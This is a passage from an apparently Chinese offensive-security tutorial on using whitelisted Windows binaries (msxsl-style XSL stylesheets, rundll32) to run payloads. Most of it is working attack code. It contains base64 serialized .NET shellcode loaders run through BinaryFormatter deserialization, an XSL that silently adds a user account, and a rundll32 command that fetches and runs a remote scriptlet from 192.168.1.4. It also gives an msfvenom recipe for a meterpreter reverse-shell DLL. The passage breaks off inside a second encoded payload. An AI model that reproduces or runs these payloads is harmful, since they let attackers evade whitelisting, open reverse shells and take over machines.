class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAIAAAAAAAAAAAAAAAIIAAASAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAALnRleHQAAAAUCgAAACAAAAAMAAAAAgAAAAAAAAAAAAAAAAAAIAAAYC5yc3JjAAAA0AIAAABA&quot;+  </span><br><span class="line">&quot;AAAABAAAAA4AAAAAAAAAAAAAAAAAAEAAAEAucmVsb2MAAAwAAAAAYAAAAAIAAAASAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAABAAABCAAAAAAAAAAAAAAAAAAAAAPApAAAAAAAASAAAAAIABQBEIgAAfAcAAAMAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQgIoBAAACgAA&quot;+  </span><br><span class="line">&quot;KAIAAAYAACoAAAAAAAAA&#x2F;OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH&#x2F;rDxhfAIsIMHPDQHH&quot;+  </span><br><span class="line">&quot;4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx&#x2F;6zBzw0BxzjgdfYDffg7fSR15FiL&quot;+  </span><br><span class="line">&quot;WCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf&#x2F;gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej&#x2F;&quot;+  </span><br><span class="line">&quot;0LiQAQAAKcRUUGgpgGsA&#x2F;9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D&#x2F;1ZdqEFZXaJmldGH&#x2F;&quot;+  </span><br><span class="line">&quot;1YXAdAr&#x2F;Tgh17OhnAAAAagBqBFZXaALZyF&#x2F;&#x2F;1YP4AH42izZqQGgAEAAAVmoAaFikU+X&#x2F;1ZNTagBW&quot;+  </span><br><span class="line">&quot;U1doAtnIX&#x2F;&#x2F;Vg&#x2F;gAfShYaABAAABqAFBoCy8PMP&#x2F;VV2h1bk1h&#x2F;9VeXv8MJA+FcP&#x2F;&#x2F;&#x2F;+mb&#x2F;&#x2F;&#x2F;&#x2F;AcMp&quot;+  </span><br><span class="line">&quot;xnXBw7vwtaJWagBT&#x2F;9UAAAATMAYAZQAAAAEAABEAIFUBAACNBgAAASXQAwAABCgGAAAKChYGjml+&quot;+  </span><br><span class="line">&quot;AQAABH4CAAAEKAMAAAYLBhYHbigHAAAKBo5pKAgAAAoAfgkAAAoMFg1+CQAAChMEFhYHEQQWEgMo&quot;+  </span><br><span class="line">&quot;BAAABgwIFSgFAAAGJisAKkogABAAAIABAAAEH0CAAgAABCpCU0pCAQABAAAAAAAMAAAAdjQuMC4z&quot;+  </span><br><span class="line">&quot;MDMxOQAAAAAFAGwAAABgAgAAI34AAMwCAABkAwAAI1N0cmluZ3MAAAAAMAYAAAgAAAAjVVMAOAYA&quot;+  </span><br><span class="line">&quot;ABAAAAAjR1VJRAAAAEgGAAA0AQAAI0Jsb2IAAAAAAAAAAgAAAVfVAjQJAgAAAPolMwAWAAABAAAA&quot;+  </span><br><span class="line">&quot;DwAAAAQAAAADAAAABgAAAAwAAAALAAAABAAAAAEAAAABAAAAAQAAAAEAAAADAAAAAQAAAAEAAAAB&quot;+  </span><br><span class="line">&quot;AAAAAQAAAAAACgABAAAAAAAGAEsARAAGAFsBPwEGAHcBPwEGAKYBhgEGAMYBhgEGAPcBRAAGAEEC&quot;+  </span><br><span class="line">&quot;hgEGAFwCRAAGAJgChgEGAKcCRAAGAK0CRAAGANACRAAGAAID4wIGABQD4wIGAEcDNwMAAAAAAQAA&quot;+  </span><br><span class="line">&quot;AAAAAQABAAEAEAAhACkABQABAAEAAAAAAPwBAAAFAAMABwATAQAAZgIAACEABAAHABEAXQASABEA&quot;+  </span><br><span class="line">&quot;aAASABMBhAI+AFAgAAAAAIYYUgAKAAEAwCEAAAAAkQBYAA4AAQAAAAAAgACRIH8AFQABAAAAAACA&quot;+  </span><br><span class="line">&quot;AJEgjAAdAAUAAAAAAIAAkSCZACgACwAxIgAAAACRGDADDgANAAAAAQCtAAAAAgC5AAAAAwC+AAAA&quot;+  </span><br><span class="line">&quot;BADPAAAAAQDZAAAAAgDsAAAAAwD4AAAABAAHAQAABQANAQAABgAdAQAAAQAoAQAAAgAwAREAUgAu&quot;+  </span><br><span class="line">&quot;ACEAUgA0ACkAUgAKAAkAUgAKADkAUgAKAEkAwAJCAGEA1wJKAGkACgNPAGEADwNYAHEAUgBkAHkA&quot;+  </span><br><span class="line">&quot;UgAKACcAWwA5AC4AEwBpAC4AGwByAGMAKwA5AAgABgCRAAEAVQEAAAQAWwAnAwABBwB&#x2F;AAEAAAEJ&quot;+  </span><br><span class="line">&quot;AIwAAQAAAQsAmQABAGggAAADAASAAAAAAAAAAAAAAAAAAAAAAOQBAAAEAAAAAAAAAAAAAAABADsA&quot;+  </span><br><span class="line">&quot;AAAAAAQAAwAAAAA8TW9kdWxlPgB3bWlfY3NfZGxsX3BheWxvYWQuZGxsAFByb2dyYW0AU2hlbGxD&quot;+  </span><br><span class="line">&quot;b2RlTGF1bmNoZXIAbXNjb3JsaWIAU3lzdGVtAE9iamVjdAAuY3RvcgBNYWluAE1FTV9DT01NSVQA&quot;+  </span><br><span class="line">&quot;UEFHRV9FWEVDVVRFX1JFQURXUklURQBWaXJ0dWFsQWxsb2MAQ3JlYXRlVGhyZWFkAFdhaXRGb3JT&quot;+  </span><br><span class="line">&quot;aW5nbGVPYmplY3QAbHBTdGFydEFkZHIAc2l6ZQBmbEFsbG9jYXRpb25UeXBlAGZsUHJvdGVjdABs&quot;+  </span><br><span class="line">&quot;cFRocmVhZEF0dHJpYnV0ZXMAZHdTdGFja1NpemUAbHBTdGFydEFkZHJlc3MAcGFyYW0AZHdDcmVh&quot;+  </span><br><span class="line">&quot;dGlvbkZsYWdzAGxwVGhyZWFkSWQAaEhhbmRsZQBkd01pbGxpc2Vjb25kcwBTeXN0ZW0uU2VjdXJp&quot;+  </span><br><span class="line">&quot;dHkuUGVybWlzc2lvbnMAU2VjdXJpdHlQZXJtaXNzaW9uQXR0cmlidXRlAFNlY3VyaXR5QWN0aW9u&quot;+  </span><br><span class="line">&quot;AFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0&quot;+  </span><br><span class="line">&quot;dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQB3bWlfY3NfZGxsX3BheWxvYWQA&quot;+  </span><br><span class="line">&quot;Qnl0ZQA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz57MEQxQTVERjAtRDZCNy00RUUzLUJB&quot;+  </span><br><span class="line">&quot;QzItOTY0MUUyREJCMDNFfQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBWYWx1ZVR5cGUAX19T&quot;+  </span><br><span class="line">&quot;dGF0aWNBcnJheUluaXRUeXBlU2l6ZT0zNDEAJCRtZXRob2QweDYwMDAwMDItMQBSdW50aW1lSGVs&quot;+  </span><br><span class="line">&quot;cGVycwBBcnJheQBSdW50aW1lRmllbGRIYW5kbGUASW5pdGlhbGl6ZUFycmF5AEludFB0cgBvcF9F&quot;+</span><br><span class="line">&quot;eHBsaWNpdABTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMATWFyc2hhbABDb3B5AFplcm8A&quot;+  </span><br><span class="line">&quot;RGxsSW1wb3J0QXR0cmlidXRlAGtlcm5lbDMyAC5jY3RvcgBTeXN0ZW0uU2VjdXJpdHkAVW52ZXJp&quot;+  </span><br><span class="line">&quot;ZmlhYmxlQ29kZUF0dHJpYnV0ZQAAAAAAAyAAAAAAAPBdGg231uNOusKWQeLbsD4ACLd6XFYZNOCJ&quot;+  </span><br><span class="line">&quot;AyAAAQMAAAECBgkHAAQJCQkJCQoABhgJCQkYCRAJBQACCRgJBSABARENBCABAQgEAQAAAAMGERAH&quot;+  </span><br><span class="line">&quot;AAIBEikRLQQAARgKCAAEAR0FCBgIAgYYCAcFHQUJGAkYBCABAQ4IAQAIAAAAAAAeAQABAFQCFldy&quot;+  </span><br><span class="line">&quot;YXBOb25FeGNlcHRpb25UaHJvd3MBgJ4uAYCEU3lzdGVtLlNlY3VyaXR5LlBlcm1pc3Npb25zLlNl&quot;+  </span><br><span class="line">&quot;Y3VyaXR5UGVybWlzc2lvbkF0dHJpYnV0ZSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs&quot;+  </span><br><span class="line">&quot;dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5FQFUAhBTa2lwVmVy&quot;+  </span><br><span class="line">&quot;aWZpY2F0aW9uAQAAAOgpAAAAAAAAAAAAAP4pAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAADwKQAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAP8lACAAEAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAB0AgAAAAAAAAAAAAB0AjQAAABW&quot;+  </span><br><span class="line">&quot;AFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv&#x2F;gAAAQAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;PwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAA&quot;+  </span><br><span class="line">&quot;AAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAE1AEAAAEAUwB0AHIAaQBuAGcA&quot;+  </span><br><span class="line">&quot;RgBpAGwAZQBJAG4AZgBvAAAAsAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBE&quot;+  </span><br><span class="line">&quot;AGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4A&quot;+  </span><br><span class="line">&quot;AAAAADAALgAwAC4AMAAuADAAAABQABcAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHcAbQBp&quot;+  </span><br><span class="line">&quot;AF8AYwBzAF8AZABsAGwAXwBwAGEAeQBsAG8AYQBkAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEA&quot;+  </span><br><span class="line">&quot;bABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABYABcAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBu&quot;+  </span><br><span class="line">&quot;AGEAbQBlAAAAdwBtAGkAXwBjAHMAXwBkAGwAbABfAHAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAA&quot;+  </span><br><span class="line">&quot;NAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAADgACAAB&quot;+  </span><br><span class="line">&quot;AEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAABA6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+</span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;+  </span><br><span class="line">&quot;AAAAAAAAAAAAAAAAAAAAAAENAAAABAAAAAkXAAAACQYAAAAJFgAAAAYaAAAAJ1N5c3RlbS5SZWZs&quot;+  </span><br><span class="line">&quot;ZWN0aW9uLkFzc2VtYmx5IExvYWQoQnl0ZVtdKQgAAAAKCwAA&quot;;</span><br><span class="line"></span><br><span class="line">		var entry_class &#x3D; &#39;ShellCodeLauncher.Program&#39;;</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line"></span><br><span class="line">		setversion();</span><br><span class="line"></span><br><span class="line">		var stm &#x3D; base64ToStream(serialized_obj);</span><br><span class="line"></span><br><span class="line">		var fmt &#x3D; new ActiveXObject(&#39;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&#39;);</span><br><span class="line"></span><br><span class="line">		var al &#x3D; new ActiveXObject(&#39;System.Collections.ArrayList&#39;);</span><br><span class="line"></span><br><span class="line">		var d &#x3D; fmt.Deserialize_2(stm);</span><br><span class="line"></span><br><span class="line">		al.Add(undefined);</span><br><span class="line"></span><br><span class="line">		var o &#x3D; d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);</span><br><span class="line"></span><br><span class="line">		&#125; catch (e) &#123;</span><br><span class="line"></span><br><span class="line">		debug(e.message);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>Micropoor_2003.xsl</strong></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&#39;0&#39;?&gt;</span><br><span class="line">&lt;stylesheet</span><br><span class="line">	xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.worg&#x2F;1999&#x2F;XSL&#x2F;Transform&quot; xmlns:ms&#x3D;&quot;urn:schemas‐microsoft‐com:xslt&quot;</span><br><span class="line"></span><br><span class="line">	xmlns:user&#x3D;&quot;placeholder&quot;</span><br><span class="line">	version&#x3D;&quot;0&quot;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;output method&#x3D;&quot;text&quot;&#x2F;&gt;</span><br><span class="line"></span><br><span class="line">	&lt;ms:script implements‐prefix&#x3D;&quot;user&quot; language&#x3D;&quot;JScript&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		&lt;![CDATA[</span><br><span class="line"></span><br><span class="line">		var r &#x3D; new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;net user Micropoor Micropoor &#x2F;add&quot;);</span><br><span class="line"></span><br><span class="line">	]]&gt; &lt;&#x2F;ms:script&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;stylesheet&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="81-基于白名单Rundll32-exe执行payload第十一季"><a href="#81-基于白名单Rundll32-exe执行payload第十一季" class="headerlink" title="81. 基于白名单Rundll32.exe执行payload第十一季"></a>81. 基于白名单Rundll32.exe执行payload第十一季</h2></li>
<li><p>Windows 2003 默认位置</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe</span><br><span class="line">C:\Windows\SysWOW64\rundll32.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>Windows 7 默认位置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe</span><br><span class="line">C:\Windows\SysWOW64\rundll32.exe</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\SysWOW64\rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;document.write();GetObject(&quot;script:http:&#x2F;&#x2F;192.168.1.4&#x2F;Rundll32_shellcode&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>基于本地加载（2）</p>
<ul>
<li><strong>payload</strong>配置</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐a x86 ‐‐platform windows ‐p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.4 LPORT&#x3D;53 ‐f dll &gt; Micropoor_Rundll32.dll</span><br></pre></td></tr></table></figure>
<ul>
<li>靶机执行</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32 shell32.dll,Control_RunDLL d:\Micropoor_Rundll32.dll</span><br></pre></td></tr></table></figure></li>
<li><p>基于命令执行（3）</p>
<ul>
<li>靶机执行[<strong>Windows 2003</strong>]</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:&quot;\..\mshtml.dll,RunHTMLApplication &quot;;eval(&quot;w&#x3D;new ActiveXObject(\&quot;WScript.Shell\&quot;);w.run(\&quot;mstsc\&quot;);window.close()&quot;);</span><br></pre></td></tr></table></figure></li>
<li><p>Rundll32_shellcode</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">&lt;?xml version&#x3D;&quot;0&quot;?&gt;  </span><br><span class="line">&lt;package&gt;  </span><br><span class="line">&lt;component id&#x3D;&quot;Micropoor&quot;&gt;  </span><br><span class="line">&lt;script language&#x3D;&quot;JScript&quot;&gt;  </span><br><span class="line">&lt;![CDATA[  </span><br><span class="line">function setversion() &#123;  </span><br><span class="line">&#125;  </span><br><span class="line">function debug(s) &#123;&#125;  </span><br><span class="line">function base64ToStream(b) &#123;  </span><br><span class="line">var enc &#x3D; new ActiveXObject(&quot;System.Text.ASCIIEncoding&quot;);  </span><br><span class="line">var length &#x3D; enc.GetByteCount_2(b);  </span><br><span class="line">var ba &#x3D; enc.GetBytes_4(b);  </span><br><span class="line">var transform &#x3D; new ActiveXObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;);  </span><br><span class="line">ba &#x3D; transform.TransformFinalBlock(ba, 0, length);  </span><br><span class="line">var ms &#x3D; new ActiveXObject(&quot;System.IO.MemoryStream&quot;);  </span><br><span class="line">ms.Write(ba, 0, (length &#x2F; 4) * 3);  </span><br><span class="line">ms.Position &#x3D; 0;  </span><br><span class="line">return ms;  </span><br><span class="line">&#125; </span><br><span class="line">var serialized_obj &#x3D; &quot;AAEAAAD&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;+  </span><br><span class="line">&quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;+  </span><br><span class="line">&quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;+</span><br><span class="line">&quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;+  </span><br><span class="line">&quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;+  </span><br><span class="line">&quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;+  </span><br><span class="line">&quot;eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl&quot;+  </span><br><span class="line">&quot;cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90&quot;+  </span><br><span class="line">&quot;aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu&quot;+  </span><br><span class="line">&quot;MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH&quot;+  </span><br><span class="line">&quot;dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA&quot;+  </span><br><span class="line">&quot;ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw&quot;+  </span><br><span class="line">&quot;B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu&quot;+  </span><br><span class="line">&quot;dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA&quot;+  </span><br><span class="line">&quot;CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u&quot;+  </span><br><span class="line">&quot;SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5&quot;+  </span><br><span class="line">&quot;cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR&quot;+  </span><br><span 